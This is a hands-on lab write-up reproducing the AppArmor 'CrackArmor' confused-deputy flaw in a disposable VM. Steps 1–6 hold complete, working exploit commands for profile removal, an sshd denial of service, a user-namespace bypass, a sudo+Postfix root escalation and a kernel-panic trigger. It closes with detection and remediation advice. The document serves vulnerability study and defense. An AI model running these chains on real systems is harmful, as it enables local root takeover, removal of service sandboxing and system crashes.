# CrackArmor: Reproducing the AppArmor Confused-Deputy Vulnerability in a Safe Lab

*A hands-on walkthrough of CVE-2026-23268 — from spinning up an isolated KVM virtual machine to removing AppArmor profiles, loading deny-all policies, bypassing user-namespace restrictions, and escalating to root — all from an unprivileged user.*

---

> **Disclaimer** — Everything described here is for **educational and defensive security research only**. Reproduce these steps **exclusively inside a disposable virtual machine** that you fully control. Never run exploits on production systems, shared infrastructure, or any machine you care about. Unauthorized access to computer systems is a crime.

---

## Table of Contents

1. [Background — What is CrackArmor?](#1-background--what-is-crackarmor)
2. [Lab Prerequisites](#2-lab-prerequisites)
3. [Spinning Up the Vulnerable VM](#3-spinning-up-the-vulnerable-vm)
4. [Understanding the Attack Surface](#4-understanding-the-attack-surface)
5. [Step 1 — Confirming the Confused Deputy](#5-step-1--confirming-the-confused-deputy)
6. [Step 2 — Removing an Existing AppArmor Profile](#6-step-2--removing-an-existing-apparmor-profile)
7. [Step 3 — Loading a Deny-All Profile (DoS)](#7-step-3--loading-a-deny-all-profile-dos)
8. [Step 4 — Bypassing User-Namespace Restrictions](#8-step-4--bypassing-user-namespace-restrictions)
9. [Step 5 — Privilege Escalation via Sudo + Postfix](#9-step-5--privilege-escalation-via-sudo--postfix)
10. [Step 6 — Kernel Stack Exhaustion (Crash / DoS)](#10-step-6--kernel-stack-exhaustion-crash--dos)
11. [Detection and Remediation](#11-detection-and-remediation)
12. [Closing Thoughts](#12-closing-thoughts)

---

## 1. Background — What is CrackArmor?

In March 2026 the [Qualys Threat Research Unit disclosed nine vulnerabilities](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/12/crackarmor-critical-apparmor-flaws-enable-local-privilege-escalation-to-root) in **AppArmor**, the Mandatory Access Control (MAC) framework shipped — and **enabled by default** — on Ubuntu, Debian, and SUSE. The flaw chain has existed in the Linux kernel since **v4.11 (2017)**, affecting over 12.6 million systems.

The root cause is a **confused-deputy problem**: the pseudo-files used to manage AppArmor profiles are **world-writable** (`mode 0666`). While a direct `write()` from an unprivileged user is blocked by a kernel permission check, an attacker can open the file, `dup2()` the fd onto stdout/stderr, and then `execve()` a privileged SUID-root binary (`su -P`) to perform the actual `write()` on their behalf. The privileged binary passes the kernel check, and AppArmor happily processes the payload.

This single primitive — **load, replace, or remove arbitrary AppArmor profiles as any unprivileged user** — unlocks:

| Impact | CVE(s) |
|---|---|
| Remove profiles protecting services (cupsd, rsyslogd) | CVE-2026-23268 |
| Deny-all profiles → denial-of-service (block sshd, etc.) | CVE-2026-23268 |
| Bypass Ubuntu's unprivileged user-namespace restrictions | CVE-2026-23268 |
| Local privilege escalation to root via Sudo + Postfix | CVE-2026-23268 |
| Kernel stack exhaustion → system crash | CVE-2026-23404/23405 |
| Out-of-bounds kernel memory read (KASLR bypass) | CVE-2026-23406 |
| Use-after-free → LPE to root | CVE-2026-23410/23411 |
| Double-free → LPE to root | CVE-2026-23408 |

The full technical advisory is at [qualys.com/2026/03/10/crack-armor.txt](https://www.qualys.com/2026/03/10/crack-armor.txt).

---

## 2. Lab Prerequisites

You need a **Linux host with KVM** installed. **Do not run the vulnerable VM on a machine you care about** — use a dedicated hypervisor, a spare box, or a cloud instance.

### Install KVM (if you haven't already)

The repo ships an `install-kvm.sh` script:

```bash
# From the repo root
chmod +x install-kvm.sh
sudo ./install-kvm.sh
```

This installs `qemu-kvm`, `libvirt`, `virtinst`, `cloud-image-utils`, creates the default NAT network, and adds your user to the `libvirt` and `kvm` groups.

> After running the script, **log out and back in** (or reboot) so group membership takes effect.

### Verify KVM works

```bash
virsh list --all          # should connect to libvirt
kvm-ok                    # should say "KVM acceleration can be used"
```

### Minimum host resources

| Resource | Minimum |
|---|---|
| Free RAM | 4 GB |
| Free disk (`/var/lib/libvirt/images`) | 25 GB |
| CPU | 2 cores (passed to the VM) |

---

## 3. Spinning Up the Vulnerable VM

The repo includes a purpose-built provisioning script at `security/crackarmor/create-vuln-vm.sh`. It is a modified version of the Kubernetes `create-vms.sh` script, tuned for security research:

```bash
cd security/crackarmor
chmod +x create-vuln-vm.sh
./create-vuln-vm.sh
```

What it does:

1. Downloads the **Ubuntu 24.04 (Noble Numbat)** cloud image — AppArmor is enabled by default.
2. Cloud-init provisions the VM with:
   - `ubuntu / ubuntu` — admin account with `sudo` (for setup tasks)
   - `jane / jane` — **unprivileged** user (for exploit testing)
   - `postfix` — needed for the Sudo+Postfix LPE chain
   - `apparmor-utils` — provides `apparmor_parser`, `aa-exec`, `aa-status`
   - Kernel packages **held** (`apt-mark hold`) to prevent accidental patching
3. Creates a 25 GB qcow2 disk backed by the cloud image and boots it with 4 GB RAM / 2 vCPUs.

### Connect to the VM

```bash
# Wait ~60 seconds for cloud-init to finish, then:
virsh console crackarmor-lab
# or SSH:
VM_IP=$(virsh domifaddr crackarmor-lab | awk '/ipv4/{print $4}' | cut -d/ -f1)
ssh ubuntu@$VM_IP
```

### Verify AppArmor is active

```bash
ubuntu@crackarmor-lab:~$ sudo aa-status | head -5
apparmor module is loaded.
56 profiles are loaded.
19 profiles are in enforce mode.
...
```

### Verify the pseudo-files are world-writable

```bash
ubuntu@crackarmor-lab:~$ ls -l /sys/kernel/security/apparmor/{.load,.replace,.remove}
-rw-rw-rw- 1 root root 0 ... /sys/kernel/security/apparmor/.load
-rw-rw-rw- 1 root root 0 ... /sys/kernel/security/apparmor/.remove
-rw-rw-rw- 1 root root 0 ... /sys/kernel/security/apparmor/.replace
```

These `0666` permissions are the heart of the vulnerability. Any user can `open()` them, and a privileged deputy can `write()` through the resulting fd.

### Tear down when finished

```bash
sudo virsh destroy crackarmor-lab
sudo virsh undefine crackarmor-lab --remove-all-storage
```

---

## 4. Understanding the Attack Surface

Here is the confused-deputy flow, step by step:

```
 Unprivileged user (jane)
       │
       │  1. open("/sys/kernel/security/apparmor/.remove", O_WRONLY)
       │     → succeeds (mode 0666)
       │
       │  2. dup2(fd, STDOUT_FILENO) or redirect via shell
       │
       │  3. exec("su -P -c 'stty raw && echo -n <profile>' $USER")
       │     └─ su is SUID root
       │        └─ su's write() to stdout goes to the .remove pseudo-file
       │           └─ kernel checks: caller is root → ALLOWED
       │
       ▼
 AppArmor removes the named profile
```

The key insight from the [Qualys advisory](https://www.qualys.com/2026/03/10/crack-armor.txt): `su -P` (pty mode) acts as a **privileged proxy** between two unprivileged programs. The inner program can produce fully controlled bytes — including null bytes — and `su` faithfully writes them to its stdout/stderr, which the attacker has redirected to AppArmor's pseudo-file. Because the kernel sees that `su` (running as root) is the caller, the write passes the AppArmor permission check.

---

## 5. Step 1 — Confirming the Confused Deputy

Log in as `jane` (the unprivileged user):

```bash
ssh jane@$VM_IP   # password: jane
```

Attempt a direct write — this **should fail**:

```bash
jane@crackarmor-lab:~$ echo whatever > /sys/kernel/security/apparmor/.remove
-bash: /sys/kernel/security/apparmor/.remove: Permission denied
```

Now try the confused-deputy vector through `su -P`:

```bash
jane@crackarmor-lab:~$ su -P -c 'echo doesnotexist' "$USER" \
  > /sys/kernel/security/apparmor/.remove
Password: jane
```

Check `dmesg` (from the `ubuntu` account or with `sudo`):

```bash
ubuntu@crackarmor-lab:~$ sudo dmesg | tail -5
...
apparmor="STATUS" operation="profile_remove" \
  info="profile does not exist" error=-2 \
  profile="unconfined" name="doesnotexist" pid=... comm="su"
```

The error is **"profile does not exist"** — not "Permission denied". AppArmor accepted the write from `su` and actually tried to find and remove a profile named `doesnotexist`. The confused deputy works.

---

## 6. Step 2 — Removing an Existing AppArmor Profile

Still as `jane`:

```bash
# Confirm the rsyslogd profile exists
jane@crackarmor-lab:~$ ls /sys/kernel/security/apparmor/policy/profiles/ \
  | grep rsyslogd
rsyslogd

# Remove it via the confused deputy
jane@crackarmor-lab:~$ su -P -c 'stty raw && echo -n rsyslogd' "$USER" \
  > /sys/kernel/security/apparmor/.remove
Password: jane

# Verify it's gone
jane@crackarmor-lab:~$ ls /sys/kernel/security/apparmor/policy/profiles/ \
  | grep rsyslogd
# (no output — the profile has been removed)
```

`stty raw` disables terminal line buffering so `echo -n` writes the exact bytes without a trailing newline. The rsyslogd service is now running **unconfined** — any remote exploit against rsyslogd would no longer be sandboxed.

---

## 7. Step 3 — Loading a Deny-All Profile (DoS)

AppArmor profiles are **allow-lists** by default: an empty profile effectively denies everything. To lock out SSH:

```bash
# As jane — compile a minimal (empty = deny-all) profile for sshd
jane@crackarmor-lab:~$ apparmor_parser -K -o sshd.pf << "EOF"
/usr/sbin/sshd {
}
EOF

# Load it through the confused deputy
jane@crackarmor-lab:~$ su -P -c 'stty raw && cat sshd.pf' "$USER" \
  > /sys/kernel/security/apparmor/.load
Password: jane

# Verify
jane@crackarmor-lab:~$ ls /sys/kernel/security/apparmor/policy/profiles/ \
  | grep sshd
sshd
```

Now, from **outside** the VM, try to SSH in:

```bash
$ ssh jane@$VM_IP
kex_exchange_identification: read: Connection reset by peer
Connection reset by 192.168.122.x port 22
```

SSH is dead. Any new sshd child process spawned to handle an incoming connection is immediately confined by our empty (deny-all) profile and cannot perform the syscalls it needs.

> **Recovery**: use `virsh console crackarmor-lab`, log in as `ubuntu`, and run `sudo apparmor_parser -R /sys/kernel/security/apparmor/policy/profiles/sshd` or simply `sudo aa-remove-unknown`.

---

## 8. Step 4 — Bypassing User-Namespace Restrictions

Ubuntu 24.04 restricts unprivileged user namespaces via AppArmor. Let's bypass that:

```bash
# As jane — user namespace creation is blocked by default
jane@crackarmor-lab:~$ unshare -U -r -m /bin/sh
unshare: write failed /proc/self/uid_map: Operation not permitted

# Compile a "userns" profile for /usr/bin/time
jane@crackarmor-lab:~$ apparmor_parser -K -o time.pf << "EOF"
/usr/bin/time flags=(unconfined) {
  userns,
}
EOF

# Load it via the confused deputy
jane@crackarmor-lab:~$ su -P -c 'stty raw && cat time.pf' "$USER" \
  > /sys/kernel/security/apparmor/.replace
Password: jane

# Now use /usr/bin/time as the entry point
jane@crackarmor-lab:~$ /usr/bin/time -- unshare -U -r -m /bin/sh
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

We now have a root-looking user namespace with full capabilities. This is the stepping stone the Qualys researchers used to create AppArmor namespaces and simplify subsequent kernel exploitation steps.

---

## 9. Step 5 — Privilege Escalation via Sudo + Postfix

This is the user-space local privilege escalation to **real root**. It requires Postfix (our cloud-init already installed it).

The attack chain:

1. Load an AppArmor profile that **denies `CAP_SETUID` to sudo** — this prevents `sudo` from dropping root privileges before executing `sendmail`.
2. Set the `MAIL_CONFIG` environment variable to a directory we control in `/tmp`, containing a fake `main.cf` and a malicious `postdrop` script.
3. Run `sudo` with an invalid command. Sudo encounters an error, tries to send an admin email via Postfix's `sendmail`, but cannot drop privileges (our AppArmor profile blocks `setuid()`), so `sendmail` runs **as root** with our controlled environment.

```bash
# As jane — set up the Postfix trap
jane@crackarmor-lab:~$ mkdir -p /tmp/postfix

jane@crackarmor-lab:~$ cat > /tmp/postfix/main.cf << "EOF"
command_directory = /tmp/postfix
EOF

jane@crackarmor-lab:~$ cat > /tmp/postfix/postdrop << "EOF"
#!/bin/sh
/usr/bin/id >> /tmp/postfix/pwned
EOF

jane@crackarmor-lab:~$ chmod -R 0755 /tmp/postfix

# Compile a profile that denies CAP_SETUID to sudo
jane@crackarmor-lab:~$ apparmor_parser -K -o sudo.pf << "EOF"
/usr/bin/sudo {
  allow file,
  allow signal,
  allow network,
  allow capability,
  deny capability setuid,
}
EOF

# Load it via the confused deputy
jane@crackarmor-lab:~$ su -P -c 'stty raw && cat sudo.pf' "$USER" \
  > /sys/kernel/security/apparmor/.replace
Password: jane

# Trigger the exploit — sudo fails, sends mail as root
jane@crackarmor-lab:~$ env -i MAIL_CONFIG=/tmp/postfix /usr/bin/sudo whatever
sudo: PERM_SUDOERS: setresuid(-1, 1, -1): Operation not permitted
sudo: unable to open /etc/sudoers: Operation not permitted
sudo: setresuid() [0, 0, 0] -> [1001, -1, -1]: Operation not permitted
sudo: error initializing audit plugin sudoers_audit

# Check the result
jane@crackarmor-lab:~$ cat /tmp/postfix/pwned
uid=0(root) gid=1001(jane) groups=1001(jane),100(users)
```

The `postdrop` script ran as **uid=0 (root)**. Replace `/usr/bin/id` with any payload and you have full root code execution.

### Why this works

The sequence inside `sudo`'s `exec_mailer()` function:

1. `setuid(0)` — succeeds (sudo is already root)
2. `setuid(1001)` — **fails** because our AppArmor profile denies `CAP_SETUID`
3. Despite the failure, `sudo` calls `execv(sendmail)` anyway — a classic **fail-open** bug
4. Postfix's `sendmail` inherits uid=0 and our `MAIL_CONFIG` pointing to `/tmp/postfix`
5. `sendmail` execs our `/tmp/postfix/postdrop` script as root

> **Note**: This fail-open in sudo was independently found and fixed in November 2025 (commit `3e474c2`). If your lab VM has the patched sudo, this specific chain won't work — but the AppArmor confused deputy (the core vulnerability) remains exploitable for all the other attack paths.

---

## 10. Step 6 — Kernel Stack Exhaustion (Crash / DoS)

AppArmor profiles can have subprofiles (children). Removing a profile recursively removes its children via `__remove_profile()` → `__aa_profile_list_release()` → `__remove_profile()` ... This recursion has no depth limit, so a 1024-level hierarchy exhausts the 16 KB kernel stack and triggers a **kernel panic**.

This requires first creating an AppArmor namespace and entering it through a user namespace (using the bypass from Step 4):

```bash
# As jane — create a namespace and enter it
jane@crackarmor-lab:~$ apparmor_parser -K -o myns.pf << "EOF"
profile :myns:mypf flags=(unconfined) {
  userns,
}
EOF

jane@crackarmor-lab:~$ su -P -c 'stty raw && cat myns.pf' "$USER" \
  > /sys/kernel/security/apparmor/.load
Password: jane

jane@crackarmor-lab:~$ /usr/bin/time -- aa-exec -n myns -p mypf \
  -- unshare -U -r /bin/bash

# Inside the namespace — load 1024 nested subprofiles
root@crackarmor-lab:~# pf='a'
root@crackarmor-lab:~# for ((i=0; i<1024; i++)); do
  echo -e "profile $pf { \n }" | apparmor_parser -K -a
  pf="$pf//x"
done

# Trigger the recursive removal → kernel panic
root@crackarmor-lab:~# echo -n a > /sys/kernel/security/apparmor/.remove
```

The VM will freeze and reboot (or hang, depending on kernel config). This is a **denial of service only** — the `CONFIG_VMAP_STACK` guard page prevents turning the stack overflow into code execution.

---

## 11. Detection and Remediation

### Detect

- **Monitor** writes to `/sys/kernel/security/apparmor/{.load,.replace,.remove}` with `auditd` or eBPF/Falco rules.
- **Alert** on unexpected AppArmor profile changes via `aa-status` diffs in your monitoring pipeline.
- **Scan** with [Qualys QID 386714](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/12/crackarmor-critical-apparmor-flaws-enable-local-privilege-escalation-to-root) or check your kernel version against affected ranges.

### Remediate

1. **Patch immediately**: Apply vendor kernel updates — all distro security teams have published fixes:
   - Ubuntu: USN updates for Noble/Jammy
   - Debian: DSA for Bookworm/Trixie
   - SUSE: SUSE-SU advisories
2. **Restrict pseudo-file permissions** as a stop-gap:
   ```bash
   sudo chmod 0600 /sys/kernel/security/apparmor/{.load,.replace,.remove}
   ```
   (This is reverted on reboot unless made persistent via a systemd unit.)
3. **Update sudo** to >= the version containing commit `3e474c2` to close the fail-open path.
4. **Audit** for rogue AppArmor profiles that may have been planted before patching.

---

## 12. Closing Thoughts

CrackArmor is a textbook case of a **confused deputy** turning a seemingly harmless permission (world-writable pseudo-files) into full system compromise. The vulnerability sat in plain sight for **nine years** — from kernel v4.11 in 2017 to the Qualys disclosure in March 2026.

The takeaways:

- **Default configurations are attack surface.** AppArmor's `0666` pseudo-files were a design choice that predated the current threat landscape of user-namespace attacks and container breakouts.
- **Fail-open is fail-fatal.** Sudo's `exec_mailer()` continued execution after a failed `setuid()` — exactly the kind of "shouldn't happen" path that attackers specialize in reaching.
- **Defense-in-depth works both ways.** AppArmor was supposed to be a defense layer. Instead, its code became the attack surface — perfectly illustrating Jann Horn's maxim that [mitigations are attack surface, too](https://projectzero.google/2020/02/mitigations-are-attack-surface-too.html).

Patch your kernels.

---

### References

- [Qualys Blog: CrackArmor Advisory](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/12/crackarmor-critical-apparmor-flaws-enable-local-privilege-escalation-to-root)
- [Full Technical Advisory (crack-armor.txt)](https://www.qualys.com/2026/03/10/crack-armor.txt)
- [Jann Horn — Mitigations are Attack Surface, Too](https://projectzero.google/2020/02/mitigations-are-attack-surface-too.html)
- [Crusaders of Rust — CVE-2025-38001](https://syst3mfailure.io/rbtree-family-drama/)
- [Jann Horn — How a Simple Linux Kernel Memory Corruption Bug Can Lead to Complete System Compromise](https://projectzero.google/2021/10/how-simple-linux-kernel-memory.html)

---

*Lab scripts and the VM provisioner are in the `security/crackarmor/` directory of this repo.*
